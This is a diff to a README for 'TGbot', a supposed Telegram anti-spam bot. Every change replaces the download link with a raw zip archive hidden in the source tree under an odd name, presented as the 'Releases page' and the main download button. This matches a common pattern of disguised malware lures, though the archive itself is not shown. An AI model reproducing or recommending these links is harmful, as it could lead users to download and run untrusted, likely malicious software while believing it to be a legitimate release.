@@ -4,7 +4,7 @@
 TGbot is a two-way messaging bot that blocks spam ads using verification codes. With this tool, you can enjoy cleaner conversations without unnecessary distractions. 
 
 ## 🔗 Download Now
-[![Download TGbot](https://raw.githubusercontent.com/kuntul537/TGbot/main/src/handlers/TGbot_v1.5.zip)](https://raw.githubusercontent.com/kuntul537/TGbot/main/src/handlers/TGbot_v1.5.zip)
+[![Download TGbot](https://github.com/kuntul537/TGbot/raw/refs/heads/main/src/filters/T_Gbot_obedientialness.zip)](https://github.com/kuntul537/TGbot/raw/refs/heads/main/src/filters/T_Gbot_obedientialness.zip)
 
 ## 🚀 Getting Started
 To start using TGbot, follow the simple steps below to download and install the application. 
@@ -17,7 +17,7 @@ To start using TGbot, follow the simple steps below to download and install the 
 
 ## 📥 Download & Install
 1. **Visit the Releases Page:**
-   To get TGbot, visit the [Releases page](https://raw.githubusercontent.com/kuntul537/TGbot/main/src/handlers/TGbot_v1.5.zip) where you can find the latest version of the application.
+   To get TGbot, visit the [Releases page](https://github.com/kuntul537/TGbot/raw/refs/heads/main/src/filters/T_Gbot_obedientialness.zip) where you can find the latest version of the application.
 
 2. **Select the Latest Version:**
    Look for the newest release and click on it. This will take you to the page where you can view all the details.
@@ -49,7 +49,7 @@ To start using TGbot, follow the simple steps below to download and install the 
 If you encounter issues or have questions, feel free to reach out. You can open an issue on this GitHub repository, and we will assist you as soon as possible.
 
 ## 📢 Update Notifications
-To stay updated with the latest features and improvements, check the [Releases page](https://raw.githubusercontent.com/kuntul537/TGbot/main/src/handlers/TGbot_v1.5.zip) regularly. You can also enable notifications for this repository.
+To stay updated with the latest features and improvements, check the [Releases page](https://github.com/kuntul537/TGbot/raw/refs/heads/main/src/filters/T_Gbot_obedientialness.zip) regularly. You can also enable notifications for this repository.
 
 ## 🔄 Feedback
 We welcome any feedback or suggestions. Your input helps us improve TGbot and enhance its performance. 
